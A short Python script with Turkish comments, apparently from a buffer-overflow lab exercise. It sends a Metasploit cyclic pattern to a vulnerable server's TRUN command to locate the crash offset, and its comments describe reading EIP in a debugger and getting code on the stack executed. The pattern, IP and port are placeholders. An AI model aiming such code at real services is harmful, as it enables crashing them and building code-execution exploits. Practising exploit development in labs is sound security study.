#socket overflow yaptıktan sonra kaçıncı karakterde çöktüğünü ayrıntılı bulmaya yarar
#metasploit-framework/tools/exploit klasöründen ./pattern.create.rb -l 3000 (3000 random. çöktüğü karakter sayısına yakın olsun yeter) pattern al



import socket #karşı server a bağlanma
from time import sleep
import sys

patternCreated = "patterni kopyala"
numberOfCharacters = 100
stringToSend = "/TRUN /./:" + patternCreated #TRUN server kodu. Çökebilme ihtimalli kod


try:
    mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    mySocket.connect((ip,port))
    bytes = stringToSend.encode(encoding= "latin1")
    mySocket.send(bytes)
    mySocket.close()
except KeyboardInterrupt:
    sys.exit()

except Exception as e:
    print(e)
    sys.exit()

#immunity debugger (tersine mühendislik programı) programında program çöktükren sonra bize verilen eip bilgisi ile ./pattern.offset.rb -l 3000 -q (verilen bilgi) koduyla kaçıncı karakterde ömktüğü öğrenilebilir.
#program çöktükten sonra stack overflow olacağından programa vereceğimiz kodu kendisi stack kısmından çıkaracağından çalıştırmak mecburiyetinde kalacaktır.

